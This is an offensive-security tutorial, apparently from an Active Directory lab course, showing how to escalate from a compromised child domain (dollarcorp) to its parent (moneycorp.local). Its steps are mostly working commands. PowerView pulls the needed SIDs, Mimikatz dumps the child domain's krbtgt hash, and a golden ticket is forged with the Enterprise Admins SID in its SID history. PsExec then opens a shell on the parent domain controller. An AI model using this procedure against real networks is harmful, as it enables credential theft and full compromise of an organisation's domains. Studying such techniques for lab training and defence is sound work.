Domain Privilege Escalation - Child to Parent

Introduction

This article covers the sixth technique for Domain Privilege Escalation: Cross Forest (Child to Parent domain escalation).

What is Cross Forest?

Consider a domain named dollarcorp.moneycorp.local. Looking at this name, we can see that dollarcorp is a child domain of moneycorp. In this scenario, suppose we have already compromised the Domain Controller of the child domain (dollarcorp), but our goal is to reach the Domain Controller of the parent domain (moneycorp.local).

This is the core idea of this article: escalating from a child domain to the parent domain by forging Kerberos tickets that include the parent domain's Enterprise Admins SID.

Prerequisites

To execute this technique, three pieces of information are required:

  1. SID of the Enterprise Admins group in the parent domain
  2. SID of the child domain (dollarcorp)
  3. krbtgt hash from the child domain's Domain Controller

Walkthrough

Step 1: Load PowerView

We start by loading the PowerView development version module for Active Directory enumeration:

Import-Module .\PowerView_dev.ps1

Step 2: Extract the Enterprise Admins SID (Prerequisite 1)

The Enterprise Admins group exists in the parent domain (moneycorp.local). We need its SID because we will embed it in our forged ticket to gain enterprise-level privileges. Use the following command to extract it:

Get-NetGroup -Identity "Enterprise Admins" -Domain moneycorp.local

Note the objectsid value from the output. This is the SID of the Enterprise Admins group in the parent domain.

Step 3: Extract the Child Domain SID (Prerequisite 2)

Next, we need the SID of the child domain (dollarcorp). This will be used as the primary SID in our forged ticket:

Get-DomainSID

Step 4: Connect to the Child Domain Controller

The third prerequisite (the krbtgt hash) is stored on the Domain Controller of the child domain. Since we already have a user account that is a member of the Domain Admins group in the child domain (dollarcorp), we can connect to its Domain Controller using PowerShell Remoting:

Enter-PSSession -ComputerName dcorp-dc

Step 5: Extract the krbtgt Hash Using Mimikatz (Prerequisite 3)

Once we are on the child domain's Domain Controller, we use Mimikatz to dump the krbtgt account hash. The krbtgt account is used to sign all Kerberos tickets in the domain, so possessing its hash allows us to forge any ticket:

.\mimikatz.exe "lsadump::lsa /patch" "exit"

From the output, locate the NTLM hash for the krbtgt account. In this example, the hash is: ff46a9d8bd66c6efd77603da26796f35

Now we have all three prerequisites gathered.

Step 6: Forge a Golden Ticket with SID History

Open a new PowerShell session with Administrator privileges. Now we use Mimikatz to create a Golden Ticket that includes the Enterprise Admins SID from the parent domain in the SID History. This is what allows us to cross the trust boundary from the child domain to the parent domain:

kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /ptt

Here is what each parameter does:

  • /user:Administrator -- The username to impersonate in the forged ticket.
  • /domain:dollarcorp.moneycorp.local -- The child domain name (the domain you are currently in).
  • /krbtgt:ff46a9d8bd66c6efd77603da26796f35 -- The krbtgt NTLM hash extracted from the child domain's DC.
  • /sid:S-1-5-21-1874506631-3219952063-538504511 -- The SID of the child domain (dollarcorp).
  • /sids:S-1-5-21-280534878-1496970234-700767426-519 -- The SID of the Enterprise Admins group in the parent domain. The -519 suffix indicates the Enterprise Admins group RID.
  • /ptt -- Pass the Ticket: injects the forged ticket directly into the current session's memory.

You should substitute these values with the ones you extracted from your own environment in the previous steps.

Step 7: Verify the Ticket Was Injected

After executing the command, verify that the forged ticket was successfully injected into memory:

klist

The output should show a cached Kerberos ticket for the krbtgt service, confirming that the Golden Ticket is loaded in memory.

Step 8: Access the Parent Domain Controller

With the Golden Ticket injected, there are several ways to gain command execution on the parent domain's Domain Controller:

  • You could perform a DCSync attack to extract the NTLM hash of the parent domain's Administrator account, then use Pass the Hash to authenticate.
  • You could create scheduled tasks on the parent DC.

However, both of these approaches are time-consuming. The fastest method is to use Microsoft's PsExec tool to connect directly to the parent domain's Domain Controller:

PsExec.exe \\mcorp-dc.moneycorp.local cmd.exe

This gives us an interactive command shell on the parent domain's Domain Controller, successfully completing the escalation from the child domain to the parent domain.
